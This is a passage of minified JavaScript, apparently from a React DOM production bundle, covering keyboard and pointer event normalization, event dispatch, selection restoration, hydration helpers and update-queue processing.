",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},xn={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},Sn={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function In(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):!!(e=Sn[e])&&!!t[e]}function En(){return In}var Pn=O({},dn,{key:function(e){if(e.key){var t=kn[e.key]||e.key;if("Unidentified"!==t)return t}return"keypress"===e.type?13===(e=tn(e))?"Enter":String.fromCharCode(e):"keydown"===e.type||"keyup"===e.type?xn[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:En,charCode:function(e){return"keypress"===e.type?tn(e):0},keyCode:function(e){return"keydown"===e.type||"keyup"===e.type?e.keyCode:0},which:function(e){return"keypress"===e.type?tn(e):"keydown"===e.type||"keyup"===e.type?e.keyCode:0}}),Tn=rn(Pn),Cn=rn(O({},hn,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0})),An=rn(O({},dn,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:En})),jn=rn(O({},cn,{propertyName:0,elapsedTime:0,pseudoElement:0})),Ln=O({},hn,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Dn=rn(Ln),Nn=[9,13,27,32],Rn=u&&"CompositionEvent"in window,Mn=null;u&&"documentMode"in document&&(Mn=document.documentMode);var zn=u&&"TextEvent"in window&&!Mn,On=u&&(!Rn||Mn&&8<Mn&&11>=Mn),_n=String.fromCharCode(32),Fn=!1;function Un(e,t){switch(e){case"keyup":return-1!==Nn.indexOf(t.keyCode);case"keydown":return 229!==t.keyCode;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Wn(e){return"object"===typeof(e=e.detail)&&"data"in e?e.data:null}var qn=!1;var Bn={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Hn(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return"input"===t?!!Bn[e.type]:"textarea"===t}function Vn(e,t,n,a){Pe(a),0<(t=$a(t,"onChange")).length&&(n=new un("onChange","change",null,n,a),e.push({event:n,listeners:t}))}var $n=null,Gn=null;function Xn(e){_a(e,0)}function Qn(e){if(G(vi(e)))return e}function Yn(e,t){if("change"===e)return t}var Jn=!1;if(u){var Kn;if(u){var Zn="oninput"in document;if(!Zn){var ea=document.createElement("div");ea.setAttribute("oninput","return;"),Zn="function"===typeof ea.oninput}Kn=Zn}else Kn=!1;Jn=Kn&&(!document.documentMode||9<document.documentMode)}function ta(){$n&&($n.detachEvent("onpropertychange",na),Gn=$n=null)}function na(e){if("value"===e.propertyName&&Qn(Gn)){var t=[];Vn(t,Gn,e,ke(e)),Le(Xn,t)}}function aa(e,t,n){"focusin"===e?(ta(),Gn=n,($n=t).attachEvent("onpropertychange",na)):"focusout"===e&&ta()}function ia(e){if("selectionchange"===e||"keyup"===e||"keydown"===e)return Qn(Gn)}function ra(e,t){if("click"===e)return Qn(t)}function oa(e,t){if("input"===e||"change"===e)return Qn(t)}var sa="function"===typeof Object.is?Object.is:function(e,t){return e===t&&(0!==e||1/e===1/t)||e!==e&&t!==t};function la(e,t){if(sa(e,t))return!0;if("object"!==typeof e||null===e||"object"!==typeof t||null===t)return!1;var n=Object.keys(e),a=Object.keys(t);if(n.length!==a.length)return!1;for(a=0;a<n.length;a++){var i=n[a];if(!d.call(t,i)||!sa(e[i],t[i]))return!1}return!0}function ca(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function ua(e,t){var n,a=ca(e);for(e=0;a;){if(3===a.nodeType){if(n=e+a.textContent.length,e<=t&&n>=t)return{node:a,offset:t-e};e=n}e:{for(;a;){if(a.nextSibling){a=a.nextSibling;break e}a=a.parentNode}a=void 0}a=ca(a)}}function da(e,t){return!(!e||!t)&&(e===t||(!e||3!==e.nodeType)&&(t&&3===t.nodeType?da(e,t.parentNode):"contains"in e?e.contains(t):!!e.compareDocumentPosition&&!!(16&e.compareDocumentPosition(t))))}function pa(){for(var e=window,t=X();t instanceof e.HTMLIFrameElement;){try{var n="string"===typeof t.contentWindow.location.href}catch(a){n=!1}if(!n)break;t=X((e=t.contentWindow).document)}return t}function ha(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&("input"===t&&("text"===e.type||"search"===e.type||"tel"===e.type||"url"===e.type||"password"===e.type)||"textarea"===t||"true"===e.contentEditable)}function fa(e){var t=pa(),n=e.focusedElem,a=e.selectionRange;if(t!==n&&n&&n.ownerDocument&&da(n.ownerDocument.documentElement,n)){if(null!==a&&ha(n))if(t=a.start,void 0===(e=a.end)&&(e=t),"selectionStart"in n)n.selectionStart=t,n.selectionEnd=Math.min(e,n.value.length);else if((e=(t=n.ownerDocument||document)&&t.defaultView||window).getSelection){e=e.getSelection();var i=n.textContent.length,r=Math.min(a.start,i);a=void 0===a.end?r:Math.min(a.end,i),!e.extend&&r>a&&(i=a,a=r,r=i),i=ua(n,r);var o=ua(n,a);i&&o&&(1!==e.rangeCount||e.anchorNode!==i.node||e.anchorOffset!==i.offset||e.focusNode!==o.node||e.focusOffset!==o.offset)&&((t=t.createRange()).setStart(i.node,i.offset),e.removeAllRanges(),r>a?(e.addRange(t),e.extend(o.node,o.offset)):(t.setEnd(o.node,o.offset),e.addRange(t)))}for(t=[],e=n;e=e.parentNode;)1===e.nodeType&&t.push({element:e,left:e.scrollLeft,top:e.scrollTop});for("function"===typeof n.focus&&n.focus(),n=0;n<t.length;n++)(e=t[n]).element.scrollLeft=e.left,e.element.scrollTop=e.top}}var ma=u&&"documentMode"in document&&11>=document.documentMode,ga=null,ya=null,ba=null,wa=!1;function va(e,t,n){var a=n.window===n?n.document:9===n.nodeType?n:n.ownerDocument;wa||null==ga||ga!==X(a)||("selectionStart"in(a=ga)&&ha(a)?a={start:a.selectionStart,end:a.selectionEnd}:a={anchorNode:(a=(a.ownerDocument&&a.ownerDocument.defaultView||window).getSelection()).anchorNode,anchorOffset:a.anchorOffset,focusNode:a.focusNode,focusOffset:a.focusOffset},ba&&la(ba,a)||(ba=a,0<(a=$a(ya,"onSelect")).length&&(t=new un("onSelect","select",null,t,n),e.push({event:t,listeners:a}),t.target=ga)))}function ka(e,t){var n={};return n[e.toLowerCase()]=t.toLowerCase(),n["Webkit"+e]="webkit"+t,n["Moz"+e]="moz"+t,n}var xa={animationend:ka("Animation","AnimationEnd"),animationiteration:ka("Animation","AnimationIteration"),animationstart:ka("Animation","AnimationStart"),transitionend:ka("Transition","TransitionEnd")},Sa={},Ia={};function Ea(e){if(Sa[e])return Sa[e];if(!xa[e])return e;var t,n=xa[e];for(t in n)if(n.hasOwnProperty(t)&&t in Ia)return Sa[e]=n[t];return e}u&&(Ia=document.createElement("div").style,"AnimationEvent"in window||(delete xa.animationend.animation,delete xa.animationiteration.animation,delete xa.animationstart.animation),"TransitionEvent"in window||delete xa.transitionend.transition);var Pa=Ea("animationend"),Ta=Ea("animationiteration"),Ca=Ea("animationstart"),Aa=Ea("transitionend"),ja=new Map,La="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function Da(e,t){ja.set(e,t),l(t,[e])}for(var Na=0;Na<La.length;Na++){var Ra=La[Na];Da(Ra.toLowerCase(),"on"+(Ra[0].toUpperCase()+Ra.slice(1)))}Da(Pa,"onAnimationEnd"),Da(Ta,"onAnimationIteration"),Da(Ca,"onAnimationStart"),Da("dblclick","onDoubleClick"),Da("focusin","onFocus"),Da("focusout","onBlur"),Da(Aa,"onTransitionEnd"),c("onMouseEnter",["mouseout","mouseover"]),c("onMouseLeave",["mouseout","mouseover"]),c("onPointerEnter",["pointerout","pointerover"]),c("onPointerLeave",["pointerout","pointerover"]),l("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),l("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),l("onBeforeInput",["compositionend","keypress","textInput","paste"]),l("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),l("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),l("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Ma="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),za=new Set("cancel close invalid load scroll toggle".split(" ").concat(Ma));function Oa(e,t,n){var a=e.type||"unknown-event";e.currentTarget=n,function(e,t,n,a,i,o,s,l,c){if(We.apply(this,arguments),ze){if(!ze)throw Error(r(198));var u=Oe;ze=!1,Oe=null,_e||(_e=!0,Fe=u)}}(a,t,void 0,e),e.currentTarget=null}function _a(e,t){t=0!==(4&t);for(var n=0;n<e.length;n++){var a=e[n],i=a.event;a=a.listeners;e:{var r=void 0;if(t)for(var o=a.length-1;0<=o;o--){var s=a[o],l=s.instance,c=s.currentTarget;if(s=s.listener,l!==r&&i.isPropagationStopped())break e;Oa(i,s,c),r=l}else for(o=0;o<a.length;o++){if(l=(s=a[o]).instance,c=s.currentTarget,s=s.listener,l!==r&&i.isPropagationStopped())break e;Oa(i,s,c),r=l}}}if(_e)throw e=Fe,_e=!1,Fe=null,e}function Fa(e,t){var n=t[mi];void 0===n&&(n=t[mi]=new Set);var a=e+"__bubble";n.has(a)||(Ba(t,e,2,!1),n.add(a))}function Ua(e,t,n){var a=0;t&&(a|=4),Ba(n,e,a,t)}var Wa="_reactListening"+Math.random().toString(36).slice(2);function qa(e){if(!e[Wa]){e[Wa]=!0,o.forEach((function(t){"selectionchange"!==t&&(za.has(t)||Ua(t,!1,e),Ua(t,!0,e))}));var t=9===e.nodeType?e:e.ownerDocument;null===t||t[Wa]||(t[Wa]=!0,Ua("selectionchange",!1,t))}}function Ba(e,t,n,a){switch(Yt(t)){case 1:var i=Vt;break;case 4:i=$t;break;default:i=Gt}n=i.bind(null,t,n,e),i=void 0,!Ne||"touchstart"!==t&&"touchmove"!==t&&"wheel"!==t||(i=!0),a?void 0!==i?e.addEventListener(t,n,{capture:!0,passive:i}):e.addEventListener(t,n,!0):void 0!==i?e.addEventListener(t,n,{passive:i}):e.addEventListener(t,n,!1)}function Ha(e,t,n,a,i){var r=a;if(0===(1&t)&&0===(2&t)&&null!==a)e:for(;;){if(null===a)return;var o=a.tag;if(3===o||4===o){var s=a.stateNode.containerInfo;if(s===i||8===s.nodeType&&s.parentNode===i)break;if(4===o)for(o=a.return;null!==o;){var l=o.tag;if((3===l||4===l)&&((l=o.stateNode.containerInfo)===i||8===l.nodeType&&l.parentNode===i))return;o=o.return}for(;null!==s;){if(null===(o=bi(s)))return;if(5===(l=o.tag)||6===l){a=r=o;continue e}s=s.parentNode}}a=a.return}Le((function(){var a=r,i=ke(n),o=[];e:{var s=ja.get(e);if(void 0!==s){var l=un,c=e;switch(e){case"keypress":if(0===tn(n))break e;case"keydown":case"keyup":l=Tn;break;case"focusin":c="focus",l=gn;break;case"focusout":c="blur",l=gn;break;case"beforeblur":case"afterblur":l=gn;break;case"click":if(2===n.button)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":l=fn;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":l=mn;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":l=An;break;case Pa:case Ta:case Ca:l=yn;break;case Aa:l=jn;break;case"scroll":l=pn;break;case"wheel":l=Dn;break;case"copy":case"cut":case"paste":l=wn;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":l=Cn}var u=0!==(4&t),d=!u&&"scroll"===e,p=u?null!==s?s+"Capture":null:s;u=[];for(var h,f=a;null!==f;){var m=(h=f).stateNode;if(5===h.tag&&null!==m&&(h=m,null!==p&&(null!=(m=De(f,p))&&u.push(Va(f,m,h)))),d)break;f=f.return}0<u.length&&(s=new l(s,c,null,n,i),o.push({event:s,listeners:u}))}}if(0===(7&t)){if(l="mouseout"===e||"pointerout"===e,(!(s="mouseover"===e||"pointerover"===e)||n===ve||!(c=n.relatedTarget||n.fromElement)||!bi(c)&&!c[fi])&&(l||s)&&(s=i.window===i?i:(s=i.ownerDocument)?s.defaultView||s.parentWindow:window,l?(l=a,null!==(c=(c=n.relatedTarget||n.toElement)?bi(c):null)&&(c!==(d=qe(c))||5!==c.tag&&6!==c.tag)&&(c=null)):(l=null,c=a),l!==c)){if(u=fn,m="onMouseLeave",p="onMouseEnter",f="mouse","pointerout"!==e&&"pointerover"!==e||(u=Cn,m="onPointerLeave",p="onPointerEnter",f="pointer"),d=null==l?s:vi(l),h=null==c?s:vi(c),(s=new u(m,f+"leave",l,n,i)).target=d,s.relatedTarget=h,m=null,bi(i)===a&&((u=new u(p,f+"enter",c,n,i)).target=h,u.relatedTarget=d,m=u),d=m,l&&c)e:{for(p=c,f=0,h=u=l;h;h=Ga(h))f++;for(h=0,m=p;m;m=Ga(m))h++;for(;0<f-h;)u=Ga(u),f--;for(;0<h-f;)p=Ga(p),h--;for(;f--;){if(u===p||null!==p&&u===p.alternate)break e;u=Ga(u),p=Ga(p)}u=null}else u=null;null!==l&&Xa(o,s,l,u,!1),null!==c&&null!==d&&Xa(o,d,c,u,!0)}if("select"===(l=(s=a?vi(a):window).nodeName&&s.nodeName.toLowerCase())||"input"===l&&"file"===s.type)var g=Yn;else if(Hn(s))if(Jn)g=oa;else{g=ia;var y=aa}else(l=s.nodeName)&&"input"===l.toLowerCase()&&("checkbox"===s.type||"radio"===s.type)&&(g=ra);switch(g&&(g=g(e,a))?Vn(o,g,n,i):(y&&y(e,s,a),"focusout"===e&&(y=s._wrapperState)&&y.controlled&&"number"===s.type&&ee(s,"number",s.value)),y=a?vi(a):window,e){case"focusin":(Hn(y)||"true"===y.contentEditable)&&(ga=y,ya=a,ba=null);break;case"focusout":ba=ya=ga=null;break;case"mousedown":wa=!0;break;case"contextmenu":case"mouseup":case"dragend":wa=!1,va(o,n,i);break;case"selectionchange":if(ma)break;case"keydown":case"keyup":va(o,n,i)}var b;if(Rn)e:{switch(e){case"compositionstart":var w="onCompositionStart";break e;case"compositionend":w="onCompositionEnd";break e;case"compositionupdate":w="onCompositionUpdate";break e}w=void 0}else qn?Un(e,n)&&(w="onCompositionEnd"):"keydown"===e&&229===n.keyCode&&(w="onCompositionStart");w&&(On&&"ko"!==n.locale&&(qn||"onCompositionStart"!==w?"onCompositionEnd"===w&&qn&&(b=en()):(Kt="value"in(Jt=i)?Jt.value:Jt.textContent,qn=!0)),0<(y=$a(a,w)).length&&(w=new vn(w,e,null,n,i),o.push({event:w,listeners:y}),b?w.data=b:null!==(b=Wn(n))&&(w.data=b))),(b=zn?function(e,t){switch(e){case"compositionend":return Wn(t);case"keypress":return 32!==t.which?null:(Fn=!0,_n);case"textInput":return(e=t.data)===_n&&Fn?null:e;default:return null}}(e,n):function(e,t){if(qn)return"compositionend"===e||!Rn&&Un(e,t)?(e=en(),Zt=Kt=Jt=null,qn=!1,e):null;switch(e){case"paste":default:return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return On&&"ko"!==t.locale?null:t.data}}(e,n))&&(0<(a=$a(a,"onBeforeInput")).length&&(i=new vn("onBeforeInput","beforeinput",null,n,i),o.push({event:i,listeners:a}),i.data=b))}_a(o,t)}))}function Va(e,t,n){return{instance:e,listener:t,currentTarget:n}}function $a(e,t){for(var n=t+"Capture",a=[];null!==e;){var i=e,r=i.stateNode;5===i.tag&&null!==r&&(i=r,null!=(r=De(e,n))&&a.unshift(Va(e,r,i)),null!=(r=De(e,t))&&a.push(Va(e,r,i))),e=e.return}return a}function Ga(e){if(null===e)return null;do{e=e.return}while(e&&5!==e.tag);return e||null}function Xa(e,t,n,a,i){for(var r=t._reactName,o=[];null!==n&&n!==a;){var s=n,l=s.alternate,c=s.stateNode;if(null!==l&&l===a)break;5===s.tag&&null!==c&&(s=c,i?null!=(l=De(n,r))&&o.unshift(Va(n,l,s)):i||null!=(l=De(n,r))&&o.push(Va(n,l,s))),n=n.return}0!==o.length&&e.push({event:t,listeners:o})}var Qa=/\r\n?/g,Ya=/\u0000|\uFFFD/g;function Ja(e){return("string"===typeof e?e:""+e).replace(Qa,"\n").replace(Ya,"")}function Ka(e,t,n){if(t=Ja(t),Ja(e)!==t&&n)throw Error(r(425))}function Za(){}var ei=null,ti=null;function ni(e,t){return"textarea"===e||"noscript"===e||"string"===typeof t.children||"number"===typeof t.children||"object"===typeof t.dangerouslySetInnerHTML&&null!==t.dangerouslySetInnerHTML&&null!=t.dangerouslySetInnerHTML.__html}var ai="function"===typeof setTimeout?setTimeout:void 0,ii="function"===typeof clearTimeout?clearTimeout:void 0,ri="function"===typeof Promise?Promise:void 0,oi="function"===typeof queueMicrotask?queueMicrotask:"undefined"!==typeof ri?function(e){return ri.resolve(null).then(e).catch(si)}:ai;function si(e){setTimeout((function(){throw e}))}function li(e,t){var n=t,a=0;do{var i=n.nextSibling;if(e.removeChild(n),i&&8===i.nodeType)if("/$"===(n=i.data)){if(0===a)return e.removeChild(i),void qt(t);a--}else"$"!==n&&"$?"!==n&&"$!"!==n||a++;n=i}while(n);qt(t)}function ci(e){for(;null!=e;e=e.nextSibling){var t=e.nodeType;if(1===t||3===t)break;if(8===t){if("$"===(t=e.data)||"$!"===t||"$?"===t)break;if("/$"===t)return null}}return e}function ui(e){e=e.previousSibling;for(var t=0;e;){if(8===e.nodeType){var n=e.data;if("$"===n||"$!"===n||"$?"===n){if(0===t)return e;t--}else"/$"===n&&t++}e=e.previousSibling}return null}var di=Math.random().toString(36).slice(2),pi="__reactFiber$"+di,hi="__reactProps$"+di,fi="__reactContainer$"+di,mi="__reactEvents$"+di,gi="__reactListeners$"+di,yi="__reactHandles$"+di;function bi(e){var t=e[pi];if(t)return t;for(var n=e.parentNode;n;){if(t=n[fi]||n[pi]){if(n=t.alternate,null!==t.child||null!==n&&null!==n.child)for(e=ui(e);null!==e;){if(n=e[pi])return n;e=ui(e)}return t}n=(e=n).parentNode}return null}function wi(e){return!(e=e[pi]||e[fi])||5!==e.tag&&6!==e.tag&&13!==e.tag&&3!==e.tag?null:e}function vi(e){if(5===e.tag||6===e.tag)return e.stateNode;throw Error(r(33))}function ki(e){return e[hi]||null}var xi=[],Si=-1;function Ii(e){return{current:e}}function Ei(e){0>Si||(e.current=xi[Si],xi[Si]=null,Si--)}function Pi(e,t){Si++,xi[Si]=e.current,e.current=t}var Ti={},Ci=Ii(Ti),Ai=Ii(!1),ji=Ti;function Li(e,t){var n=e.type.contextTypes;if(!n)return Ti;var a=e.stateNode;if(a&&a.__reactInternalMemoizedUnmaskedChildContext===t)return a.__reactInternalMemoizedMaskedChildContext;var i,r={};for(i in n)r[i]=t[i];return a&&((e=e.stateNode).__reactInternalMemoizedUnmaskedChildContext=t,e.__reactInternalMemoizedMaskedChildContext=r),r}function Di(e){return null!==(e=e.childContextTypes)&&void 0!==e}function Ni(){Ei(Ai),Ei(Ci)}function Ri(e,t,n){if(Ci.current!==Ti)throw Error(r(168));Pi(Ci,t),Pi(Ai,n)}function Mi(e,t,n){var a=e.stateNode;if(t=t.childContextTypes,"function"!==typeof a.getChildContext)return n;for(var i in a=a.getChildContext())if(!(i in t))throw Error(r(108,B(e)||"Unknown",i));return O({},n,a)}function zi(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||Ti,ji=Ci.current,Pi(Ci,e),Pi(Ai,Ai.current),!0}function Oi(e,t,n){var a=e.stateNode;if(!a)throw Error(r(169));n?(e=Mi(e,t,ji),a.__reactInternalMemoizedMergedChildContext=e,Ei(Ai),Ei(Ci),Pi(Ci,e)):Ei(Ai),Pi(Ai,n)}var _i=null,Fi=!1,Ui=!1;function Wi(e){null===_i?_i=[e]:_i.push(e)}function qi(){if(!Ui&&null!==_i){Ui=!0;var e=0,t=wt;try{var n=_i;for(wt=1;e<n.length;e++){var a=n[e];do{a=a(!0)}while(null!==a)}_i=null,Fi=!1}catch(i){throw null!==_i&&(_i=_i.slice(e+1)),Ge(Ze,qi),i}finally{wt=t,Ui=!1}}return null}var Bi=[],Hi=0,Vi=null,$i=0,Gi=[],Xi=0,Qi=null,Yi=1,Ji="";function Ki(e,t){Bi[Hi++]=$i,Bi[Hi++]=Vi,Vi=e,$i=t}function Zi(e,t,n){Gi[Xi++]=Yi,Gi[Xi++]=Ji,Gi[Xi++]=Qi,Qi=e;var a=Yi;e=Ji;var i=32-ot(a)-1;a&=~(1<<i),n+=1;var r=32-ot(t)+i;if(30<r){var o=i-i%5;r=(a&(1<<o)-1).toString(32),a>>=o,i-=o,Yi=1<<32-ot(t)+i|n<<i|a,Ji=r+e}else Yi=1<<r|n<<i|a,Ji=e}function er(e){null!==e.return&&(Ki(e,1),Zi(e,1,0))}function tr(e){for(;e===Vi;)Vi=Bi[--Hi],Bi[Hi]=null,$i=Bi[--Hi],Bi[Hi]=null;for(;e===Qi;)Qi=Gi[--Xi],Gi[Xi]=null,Ji=Gi[--Xi],Gi[Xi]=null,Yi=Gi[--Xi],Gi[Xi]=null}var nr=null,ar=null,ir=!1,rr=null;function or(e,t){var n=Dc(5,null,null,0);n.elementType="DELETED",n.stateNode=t,n.return=e,null===(t=e.deletions)?(e.deletions=[n],e.flags|=16):t.push(n)}function sr(e,t){switch(e.tag){case 5:var n=e.type;return null!==(t=1!==t.nodeType||n.toLowerCase()!==t.nodeName.toLowerCase()?null:t)&&(e.stateNode=t,nr=e,ar=ci(t.firstChild),!0);case 6:return null!==(t=""===e.pendingProps||3!==t.nodeType?null:t)&&(e.stateNode=t,nr=e,ar=null,!0);case 13:return null!==(t=8!==t.nodeType?null:t)&&(n=null!==Qi?{id:Yi,overflow:Ji}:null,e.memoizedState={dehydrated:t,treeContext:n,retryLane:1073741824},(n=Dc(18,null,null,0)).stateNode=t,n.return=e,e.child=n,nr=e,ar=null,!0);default:return!1}}function lr(e){return 0!==(1&e.mode)&&0===(128&e.flags)}function cr(e){if(ir){var t=ar;if(t){var n=t;if(!sr(e,t)){if(lr(e))throw Error(r(418));t=ci(n.nextSibling);var a=nr;t&&sr(e,t)?or(a,n):(e.flags=-4097&e.flags|2,ir=!1,nr=e)}}else{if(lr(e))throw Error(r(418));e.flags=-4097&e.flags|2,ir=!1,nr=e}}}function ur(e){for(e=e.return;null!==e&&5!==e.tag&&3!==e.tag&&13!==e.tag;)e=e.return;nr=e}function dr(e){if(e!==nr)return!1;if(!ir)return ur(e),ir=!0,!1;var t;if((t=3!==e.tag)&&!(t=5!==e.tag)&&(t="head"!==(t=e.type)&&"body"!==t&&!ni(e.type,e.memoizedProps)),t&&(t=ar)){if(lr(e))throw pr(),Error(r(418));for(;t;)or(e,t),t=ci(t.nextSibling)}if(ur(e),13===e.tag){if(!(e=null!==(e=e.memoizedState)?e.dehydrated:null))throw Error(r(317));e:{for(e=e.nextSibling,t=0;e;){if(8===e.nodeType){var n=e.data;if("/$"===n){if(0===t){ar=ci(e.nextSibling);break e}t--}else"$"!==n&&"$!"!==n&&"$?"!==n||t++}e=e.nextSibling}ar=null}}else ar=nr?ci(e.stateNode.nextSibling):null;return!0}function pr(){for(var e=ar;e;)e=ci(e.nextSibling)}function hr(){ar=nr=null,ir=!1}function fr(e){null===rr?rr=[e]:rr.push(e)}var mr=v.ReactCurrentBatchConfig;function gr(e,t){if(e&&e.defaultProps){for(var n in t=O({},t),e=e.defaultProps)void 0===t[n]&&(t[n]=e[n]);return t}return t}var yr=Ii(null),br=null,wr=null,vr=null;function kr(){vr=wr=br=null}function xr(e){var t=yr.current;Ei(yr),e._currentValue=t}function Sr(e,t,n){for(;null!==e;){var a=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,null!==a&&(a.childLanes|=t)):null!==a&&(a.childLanes&t)!==t&&(a.childLanes|=t),e===n)break;e=e.return}}function Ir(e,t){br=e,vr=wr=null,null!==(e=e.dependencies)&&null!==e.firstContext&&(0!==(e.lanes&t)&&(vs=!0),e.firstContext=null)}function Er(e){var t=e._currentValue;if(vr!==e)if(e={context:e,memoizedValue:t,next:null},null===wr){if(null===br)throw Error(r(308));wr=e,br.dependencies={lanes:0,firstContext:e}}else wr=wr.next=e;return t}var Pr=null;function Tr(e){null===Pr?Pr=[e]:Pr.push(e)}function Cr(e,t,n,a){var i=t.interleaved;return null===i?(n.next=n,Tr(t)):(n.next=i.next,i.next=n),t.interleaved=n,Ar(e,a)}function Ar(e,t){e.lanes|=t;var n=e.alternate;for(null!==n&&(n.lanes|=t),n=e,e=e.return;null!==e;)e.childLanes|=t,null!==(n=e.alternate)&&(n.childLanes|=t),n=e,e=e.return;return 3===n.tag?n.stateNode:null}var jr=!1;function Lr(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function Dr(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function Nr(e,t){return{eventTime:e,lane:t,tag:0,payload:null,callback:null,next:null}}function Rr(e,t,n){var a=e.updateQueue;if(null===a)return null;if(a=a.shared,0!==(2&Al)){var i=a.pending;return null===i?t.next=t:(t.next=i.next,i.next=t),a.pending=t,Ar(e,n)}return null===(i=a.interleaved)?(t.next=t,Tr(a)):(t.next=i.next,i.next=t),a.interleaved=t,Ar(e,n)}function Mr(e,t,n){if(null!==(t=t.updateQueue)&&(t=t.shared,0!==(4194240&n))){var a=t.lanes;n|=a&=e.pendingLanes,t.lanes=n,bt(e,n)}}function zr(e,t){var n=e.updateQueue,a=e.alternate;if(null!==a&&n===(a=a.updateQueue)){var i=null,r=null;if(null!==(n=n.firstBaseUpdate)){do{var o={eventTime:n.eventTime,lane:n.lane,tag:n.tag,payload:n.payload,callback:n.callback,next:null};null===r?i=r=o:r=r.next=o,n=n.next}while(null!==n);null===r?i=r=t:r=r.next=t}else i=r=t;return n={baseState:a.baseState,firstBaseUpdate:i,lastBaseUpdate:r,shared:a.shared,effects:a.effects},void(e.updateQueue=n)}null===(e=n.lastBaseUpdate)?n.firstBaseUpdate=t:e.next=t,n.lastBaseUpdate=t}function Or(e,t,n,a){var i=e.updateQueue;jr=!1;var r=i.firstBaseUpdate,o=i.lastBaseUpdate,s=i.shared.pending;if(null!==s){i.shared.pending=null;var l=s,c=l.next;l.next=null,null===o?r=c:o.next=c,o=l;var u=e.alternate;null!==u&&((s=(u=u.updateQueue).lastBaseUpdate)!==o&&(null===s?u.firstBaseUpdate=c:s.next=c,u.lastBaseUpdate=l))}if(null!==r){var d=i.baseState;for(o=0,u=c=l=null,s=r;;){var p=s.lane,h=s.eventTime;if((a&p)===p){null!==u&&(u=u.next={eventTime:h,lane:0,tag:s.tag,payload:s.payload,callback:s.callback,next:null});e:{var f=e,m=s;switch(p=t,h=n,m.tag){case 1:if("function"===typeof(f=m.payload)){d=f.call(h,d,p);break e}d=f;break e;case 3:f.flags=-65537&f.flags|128;case 0:if(null===(p="function"===typeof(f=m.payload)?f.call(h,d,p):f)||void 0===p)break e;d=O({},d,p);break e;case 2:jr=!0}}null!==s.callback&&0!==s.lane&&(e.flags|=64,null===(p=i.effects)?i.effects=[s]:p.push(s))}else h={eventTime:h,lane:p,tag:s.tag,payload:s.payload,callback:s.callback,next:null},null===u?(c=u=h,l=d):u=u.next=h,o|=p;if(null===(s=s.next)){if(null===(s=i.shared.pending))break;s=(p=s).next,p.next=null,i.lastBaseUpdate=p,i.shared.pending=null}}if(null===u&&(l=d),i.baseState=l,i.firstBaseUpdate=c,i.lastBaseUpdate=u,null!==(t=i.shared.interleaved)){i=t;do{o|=i.lane,i=i.next}while(i!==t)}else null===r&&(i.shared.lanes=0);Ol|=o,e.lanes=o,e.memoizedState=d}}function 